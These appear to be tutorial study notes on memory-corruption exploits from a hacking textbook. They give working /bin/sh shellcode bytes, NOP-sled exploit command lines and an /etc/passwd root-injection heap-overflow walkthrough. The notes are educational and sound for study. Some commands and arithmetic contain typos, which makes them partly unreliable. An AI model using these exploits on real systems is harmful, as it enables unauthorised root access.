# Shellcode

In Hacking: The Art of Exploitation, we see how a developer's assumptions about user input may lead to serious vulnerabilities. 

## Memory

* Program memory divided into five segments: text, data, bss, heap, and stack.
* Code is compiled into branch, jump, call instructions in assembly language.
* text segment has write permissions disabled, data and bss segments store global static program variables.
* the heap stores the rest of a program's variables, variable size
* the stack tracks program context through FILO stack data structure
* stack grows toward heap allocating more of the lower memory addresses
* heap grows toward stack allocating more of the higher memory addresses
* little endian vs big endian and byte ordering in different architectures

## Buffer Overflows

When a program's user input exceeds the constraints implied in a buffer's allocation, the program is vulnerable to a buffer overflow or overrun. 

Consider the following example **overflow.c**:

```
void overflow_function(char *str)
{
    char buffer[20];
    strcpy(buffer, str); 
}

int main()
{
    char big_string[128];
    int i;

    for(i=0;i<128;i++)
    {
        big_string[i] = 'A';
    }
    overflow_function(big_string);
    exit(0);
}
```


Here, a buffer has 20 bytes allocated for it but the main function is programmed to copy a 128 byte string into that buffer triggering a segmentation fault.

The 108 bytes in excess of the 20 byte buffer will overwrite the stack frame pointer, the return address, and the str pointer function argument. After the program finishes, the program will try to jump to the return address which has been overwritten with As (0x41 in hex). The EIP goes to 0x41414141 (essentially random location in memory) which is causes the program to crash.


## Stack Overflow

Stack-based overflows are special in that the return address is overwritten. Attackers can use this to manipulate program control flow by specifying a return address to a location where executable code is stored.  Since we essentially hijack a process, this can be especially dangerous when a vulnerable program uses elevated privileges.

Making a program execute code requires encoding assembly code through **bytecode injection**. Bytecode requires that:
* the code is self-contained
* avoids certain special characters to conform to how data is represented in a buffer.

## Shellcode

A common piece of bytecode used to spawn a shell with root privileges. An example, **vuln.c**:

```
int main(int argc, char *argv[])
{
    char buffer[500];
    strcpy(buffer, argv[1]);
    return 0;
}
```

This program copies user input into a 500 byte buffer. Changing ownership and permissions makes the program above especially vulnerable:

```
gcc -0 vuln vuln.c
sudo chown root vuln
sudo chmod +s vuln
```

Use ls -l to verify root ownership of the compiled binary. Note that the suid permission bit is set.

Now an attacker would create a buffer to feed the vulnerable program. The attacker seeks to overwrite the return address with the memory address of executable shellcode which requires knowledge of its address ahead of time. 

When the attack payload is padded with NOP (no operation) instructions, an attacker can afford some imprecision in declaring the return address. When the EIP returns to any address in a "NOP sled", each NOP will be executed until the EIP points to the shellcode. The hexadecimal for a NOP is 0x90

Another technique to execute the shellcode includes padding the end of the buffer with a desired return address. Then if one of these overwrites the return, the EIP will jump into the NOP sled and then execute the shellcode. Still, an attacker must know approximately where the buffer will reside in memory to guess the correct return address.

Examining the current stack pointer, an attacker can subtract an offset to obtain the relative address of any variable. In the vulnerable c program above, the offset should be close to 0 since the first element in the stack is the buffer targeted by the shellcode.

The program **exploit.c** feeds the shellcode payload to the vulnerable program ./vuln. 
Essentially, it gets the stack pointer, crafts a buffer, and feeds that to the vulnerable program.

## Interactive Exploits

To experiment more rapidly, one can use perl to generate character strings like in the following:

```
perl -e 'print "A"x20;'
```
or equivalently,
```
perl -e 'print "\x41"x20;'
```
You can concatenate strings with the period character:
```
perl -e 'print "A"x20 ."BCD" ."\x61\x66\x67\x69"x2 ."Z";'
```
Command substitution is accomplished with the grave accent mark:
```
`perl -e 'print "uname";'`
```
Feeding a NOP sled to the vulnerable program:
```
./vuln `perl -e 'print "\x90"x200;'`
```
Writting shellcode to file:
```
perl -e 'print "\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";' > shellcode
```
Now the shellcode can be inserted into our perl string using cat:
```
./vuln `perl -e 'print "\x90"x200'; cat shellcode`
```
In the exploit.c code, the exploit buffer is padded with the return address. To read the proper address, we must account for the alignment of the 4 bytes referencing an address location by perhaps padding with 1-3 additional bytes.

In other words, the number of bytes in the NOP sled plus the shellcode must be divisible by 4. With 46 bytes of shellcode and 200 bytes of NOP sled, we have a remainder of 2 bytes causing a misalignment we can correct by adding 2 extra bytes to the NOP sled
```
./vuln `perl -e 'print "\x90"x202'; cat shellcode`
```
Finally, we can repeat the return address and concatenate this to the end of the buffer. Since the target length for the exploit buffer is about 600 bytes and the NOP sled plus shellcode occupies 248 bytes, we repeat the address (600 - 248) / 4 = 88 times. Assuming the return address printed by your ./exploit was 0xbffff978, on an x86 (little-endian) machine, you reverse the bytes for:
```
./vuln `perl -e 'print "\x90"x202'; cat shellcode``perl -e 'print "\x78\xf9\xff\xbf"x88;'`
```
Using newer gcc compilers, you will likely see **stack smashing detected** and the program will abort rather than drop you into a root shell.

Attackers can probe a vulnerable program by changing the number of times a return address is repeated to use fewer bytes in the attack payload. However the buffer will often be too small to fit our shellcode. In this case, an attacker might use an environment variable. Consider the example in **vuln2.c** With a buffer of only 5 bytes, we turn to environment variables.
```
export SHELLCODE=`perl -e 'print "\x90"x100'; cat shellcode`
```
With the debugger gdb, we can examine strings in stack memory to find the shellcode stored in the environment variable SHELLCODE 
```
gdb vuln2
...
(gdb) break main
...
(gdb) run
...
(gdb) x/20s $esp
...
(gdb) x/s <addr_of_SHELLCODE>
...
(gdb) quit
```

This logic can be implemented through the helper function in getenvaddr.c. Running this program, we can query the memory address of an environment variable. With sufficiently large NOP sled, the slight inconsistencies between gdb and our helper function can be overcome. We explore the impact of a program's name on the address with the following:
```
gcc -o a getenvaddr.c
./a SHELLCODE
cp a bb
./bb SHELLCODE
cp bb ccc
./ccc SHELLCODE
```
Using pcalc (https://github.com/vapier/pcalc.git depends on flex and bison), we can determine that there is a decrease of 2 bytes for each character added to the program name. This will help us to more precisely determine the return address and conserve bytes that would otherwise be padding.

A vulnerable program would need at least ONE character for the name. We can use this to calculate the minimum length of our NOP sled. If our helper program is named 'getenvaddr' (10 characters), we see the NOP sled should be 18 bytes because the address is adjusted by 2 bytes for every single byte in difference, thus: (10 - 1) / 2 = 18 bytes.

## Heap-based Overflow

We have a vulnerable program which illustrates the heap-based overflow in heap.c. As with the stack-based overflow, shellcode can be crafted to drop the attacker into a root shell when the SUID bit is set on the vulnerable program belonging to root.

Note that in heap.c, the memory for the variable userinput is allocated on the heap **before** the memory for the outputfile variable. With gdb, we can determine the distance between these two addresses. Since the distance is 24 bytes, and the first buffer is null terminated, we have 23 remaining bytes for the buffer before overflowing into the next buffer. 

Experiment with 23 and 24 byte arguments to the program heap. With 24 bytes, the null byte is written into the outputfile buffer, but a null bytes cannot be opened as a file. By incorporating additional characters, we can cause the program to write to a filename of our choosing rather than /tmp/notes as intended.

One exploit for this program would be to force an entry into /etc/passwd with the root privileges and SUID bit. Reviewing the format of /etc/passwd, we want to set a user ID of 0 for root privileges for an entry like:
```
myroot::0:0:me:/root:/bin/bash
```
But for our exploit, the payload would need to end with the file we wish to write to i.e. /etc/passwd. Using a symbolic link, we can make the entry end with /etc/passwd and still be a valid line in the passwd file.
```
mkdir /tmp/etc
ln -s /bin/bash /tmp/etc/passwd
```
You can test that running: /tmp/etc/passwd will drop you into a shell. Check out the symbolic link with:
```
ls -l /tmp/etc/passwd
```
This makes: myroot::0:0:me:/root/tmp/etc/passwd a valid password file entry. Now we need to modify so that the portion of the payload before "/etc/passwd" is exactly 24 bytes long:
```
echo -n "myroot::0:0:me:/root:/tmp" | wc
```
Since this string is 25 bytes long, we can cut off the 'e' in 'me' for the target entry: "myroot::0:0:m:/root:/tmp/etc/passwd". With no password and root privileges, we can obtain root access with:
```
./heap myroot::0:0:m:/root:/tmp/etc/passwd
```
Checking with cat /etc/passwd, we find myroot. Now with "su myroot" we can check that we are root with "whoami"

For some machines, the distance may actually be 32 instead of 24 bytes. In that case, try something like:
```
./heap myrootttttttt::0:0:me:/root:/tmp/etc/passwd
```
Then try:
```
su myrootttttttt
```

## Overflowing Function Pointers

Here we illustrate overflowing function pointers in the bss section of memory with a simple program called 'bss_game.c' that takes 10 credits per play and allows the user to guess a number between 1 and 20 for a chance at the 100 credit jackpot.

Note that the function contains a statically declared buffer before a statically declared function pointer. This means that if we can control the buffer overflow, we can change the control flow of the program to trigger the jackpot function for payouts.

Reviewing the debug statements around this program, we would find the difference in memory addresses of 20 bytes. The 21st byte of user input would overflow the buffer into the function pointer causing a segmentation fault.

By ending the buffer payload with a valid address of the form 'ABCD', we can overwrite the function pointer with our choice of function. Run 'nm bss_game | grep jackpot' to view the address of the jackpot function for the program. Concatenate the hexadecimal representation of the address reversed (depending on architecture) with printf:
```
./bss_game 123678901234567890'printf"\x41\x42\x43\x44"'
```
Instead of giving yourself arbitrarily many jackpots, passing the address of the shellcode environment variable from before, you can drop into a root shell.

## Mitigation
The modern 64 bit Linux OS relies on numerous techniques such as:
* using non-executable (NX) memory protection
  - attackers use jump or return to libc
* address space layout randomization (ASLR) 
  - attackers brute force 32 bit or find information leaks
* canaries which check against a secret value to verify if a program is permitted to use an overwritten return address.

